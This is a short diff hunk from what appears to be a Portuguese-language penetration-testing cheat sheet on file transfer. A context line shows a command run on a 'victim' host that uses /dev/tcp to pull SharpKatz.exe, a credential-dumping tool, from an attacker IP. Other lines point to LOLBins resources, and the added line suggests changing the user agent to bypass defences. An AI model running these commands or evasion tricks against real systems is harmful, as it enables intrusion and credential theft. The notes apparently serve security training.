@@ -384,6 +384,7 @@ victim@target:~$ cat < /dev/tcp/>10.10.15.156/8000 > SharpKatz.exe
 
 - Caso seja dados muito sensíveis para transferir, recomenda-se usar algum meio de criptografia.
 - LOLBins também podem ser necessarios para transferencia de arquivos https://lolbas-project.github.io/# e https://gtfobins.github.io/
+- Trocar o user agent é uma boa maneira de bypass em alguns casos
 
 # 🛡️ Disclaimer 
 
